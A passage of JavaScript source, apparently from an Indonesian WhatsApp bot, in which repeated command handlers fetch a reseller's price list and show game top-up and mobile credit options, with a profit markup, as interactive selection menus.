                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'aov': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP AOV*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "ARENA OF VALOR") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Arena of Valor",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

           hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'sps': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
           hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP SUPER SUS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Super Sus") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Super Sus",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'hago': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP HAGO*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "HAGO") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup HAGO",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'growtopia': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP GROWTOPIA*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Growtopia") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Growtopia",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'cod': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP CALL OF DUTY MOBILE*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Call of Duty MOBILE") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Call of Duty MOBILE",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'stumble': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
           hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP STUMBLE GUYS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Stumble Guys") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Stumble Guys",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'genshin': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP GENSHIN IMPACT*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "Genshin Impact") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Genshin Impact",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
case 'pb': {
if (isGroup) return onlyPrivate()
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA TOPUP POINT BLANK*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "POINT BLANK") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Topup Point Blank",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: teks,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Dafatar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Pilih list yang tersedia",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break
// ================================ //
case  'pricelistpulsa': {
    let tekNy = Ehztext(`🌟 *Daftar Harga Kuota* 🌟\n\n` +
                `Berikut adalah pilihan provider kuota yang tersedia:\n\n` +
                `• .pul_smartfren\n` +
                `• .pul_telkomsel\n` +
                `• .pul_axis\n` +
                `• .pul_indosat\n` +
                `• .pul_three\n` +
                `• .pul_byu\n` +
                `• .pul_xl\n\n` +
                `Silakan pilih provider untuk melihat detail harga kuota.`);

    hanz.editmsg(m.chat, tekNy, m);
    }
    break
case 'pul_smartfren': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA SMARTFREN*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "SMARTFREN" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa Smartfren",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa Smartfren",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa Smartfren",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;

case 'pul_telkomsel': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA TELKOMSEL*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "TELKOMSEL" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa Telkomsel",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa Telkomsel",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa Telkomsel",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    })
}
break;
case 'pul_axis': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA AXIS*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "AXIS" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa Axis",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa Axis",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa Axis",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'pul_indosat': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA INDOSAT*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "INDOSAT" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa Indosat",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa Indosat",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '_Jika Daftar Menu Tanda Silang Berarti Tidak Bisa Di Gunakan_',
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: [
                                    {
                                        "name": "single_select",
                                        "buttonParamsJson": JSON.stringify({
                                            title: "Pilih Di Sini",
                                            sections: [
                                                {
                                                    title: "Melakukan Topup Pulsa Indosat",
                                                    rows: listny
                                                }
                                            ]
                                        })
                                    }
                                ],
                            }),
                        }),
                    }
                }
            }, { quoted: m });

            hanz.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id
            });
        }
    });
}
break;
case 'pul_xl': {
    if (isGroup) return onlyPrivate();
    let key = new URLSearchParams();
    key.append("api_key", apikeyAtlantic);
    key.append("type", "prabayar");
    fetch("https://atlantich2h.com/layanan/price_list", {
        method: "POST",
        body: key,
        redirect: 'follow'
    })
    .then(response => response.json())
    .then(res => {
        if (!res.status) {
            reply('Server maintenance.');
            hanz.sendMessage(`${global.ownerNumber}`, { text: 'Silahkan sambungkan ip (' + res.message.replace(/[^0-9.]+/g, '') + ') tersebut ke provider' });
        } else {
            var regeXcomp = (a, b) => {
                var aPrice = Number(a.price.replace(/[^0-9.-]+/g, ""));
                var bPrice = Number(b.price.replace(/[^0-9.-]+/g, ""));
                return aPrice - bPrice;
            };
            let teks = `*LIST HARGA PULSA XL*\n\nIngin melakukan topup? ketik *${prefix}topup*\n\n`;
            res.data.sort(regeXcomp);
            let listny = [];
            for (let i of res.data) {
                if (i.provider == "XL" && i.category == "Pulsa Reguler") {
                    let prof = (untung / 100) * i.price;
                    listny.push({
                        header: "Pulsa XL",
                        title: `${i.name}`,
                        description: `Harga: Rp${toRupiah(Number(i.price) + Number(Math.ceil(prof)))} | Status: ${i.status == "available" ? "✅" : "❎"}`,
                        id: `.topup ${i.code}` // ID untuk button sesuai dengan urutan
                    });
                }
            }

            let listMessage = {
                text: teks,
                buttonText: "Pilih Di Sini",
                sections: [
                    {
                        title: "Pulsa XL",
                        rows: listny
                    }
                ]
            };

            // Kirim pesan dengan tombol single select
            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        "interactiveMessage": proto.Message.InteractiveMessage.create({
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: listMessage.text,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
